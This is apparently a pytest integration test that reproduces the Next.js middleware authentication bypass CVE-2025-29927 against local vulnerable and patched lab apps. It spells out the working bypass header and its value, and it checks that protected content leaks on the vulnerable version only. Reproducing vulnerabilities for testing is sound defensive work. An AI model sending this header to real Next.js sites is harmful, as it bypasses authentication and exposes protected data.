"""End-to-end reproduction of CVE-2025-29927 against the REAL vulnerable and
patched Next.js versions.

Vulnerable (next@14.2.24): the x-middleware-subrequest header skips middleware,
so an unauthenticated request reaches the protected page.
Patched (next@14.2.25): the header is ignored, so the request is still redirected
to /login.

Skips cleanly when node or the app's dependencies/build are not present, so the
fast unit suite still runs anywhere. CI runs this in a dedicated Node job.
"""
import contextlib
import os
import pathlib
import shutil
import socket
import subprocess
import time
import urllib.error
import urllib.request

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[1]
LABS = ROOT / "labs"
BYPASS_HEADER = "x-middleware-subrequest"
BYPASS_VALUE = "middleware:middleware:middleware:middleware:middleware"
SECRET = "SECRET: internal revenue figures Q3"

pytestmark = pytest.mark.integration


def _free_port():
    with contextlib.closing(socket.socket()) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _ensure_built(app_dir: pathlib.Path):
    if not (app_dir / "node_modules" / "next").exists():
        pytest.skip(f"{app_dir.name}: dependencies not installed (run npm install)")
    if not (app_dir / ".next").exists():
        subprocess.run(["npx", "next", "build"], cwd=app_dir, check=True,
                       capture_output=True, timeout=600)


@contextlib.contextmanager
def _running(app_dir: pathlib.Path):
    if shutil.which("node") is None or shutil.which("npx") is None:
        pytest.skip("node/npx not available")
    _ensure_built(app_dir)
    port = _free_port()
    env = {**os.environ, "PORT": str(port)}
    proc = subprocess.Popen(["npx", "next", "start", "-p", str(port)], cwd=app_dir,
                            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    base = f"http://127.0.0.1:{port}"
    try:
        deadline = time.time() + 60
        while time.time() < deadline:
            try:
                urllib.request.urlopen(base + "/", timeout=2)
                break
            except (urllib.error.URLError, ConnectionError):
                if proc.poll() is not None:
                    pytest.fail(f"{app_dir.name} server exited early")
                time.sleep(0.5)
        else:
            pytest.fail(f"{app_dir.name} server did not come up")
        yield base
    finally:
        proc.terminate()
        with contextlib.suppress(Exception):
            proc.wait(timeout=10)


def _get(url, header=None, redirect=True):
    opener = urllib.request.build_opener()
    if not redirect:
        class _NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **k):
                return None
        opener = urllib.request.build_opener(_NoRedirect)
    req = urllib.request.Request(url)
    if header:
        req.add_header(*header)
    try:
        resp = opener.open(req, timeout=10)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def test_vulnerable_app_can_be_bypassed():
    with _running(LABS / "vulnerable-app") as base:
        # 1) no header -> redirected to /login (auth enforced)
        status, _ = _get(base + "/dashboard", redirect=False)
        assert status in (302, 307), f"expected redirect, got {status}"
        # 2) with the bypass header -> protected content leaks (the vulnerability)
        status, body = _get(base + "/dashboard", header=(BYPASS_HEADER, BYPASS_VALUE))
        assert status == 200, f"expected 200, got {status}"
        assert SECRET in body, "protected content was NOT leaked — bypass did not reproduce"


def test_patched_app_blocks_the_bypass():
    with _running(LABS / "patched-app") as base:
        status, _ = _get(base + "/dashboard", redirect=False)
        assert status in (302, 307)
        # with the SAME header -> still redirected, secret never served (the fix)
        status, body = _get(base + "/dashboard", header=(BYPASS_HEADER, BYPASS_VALUE),
                            redirect=False)
        assert status in (302, 307), f"patched app should still redirect, got {status}"
        assert SECRET not in body
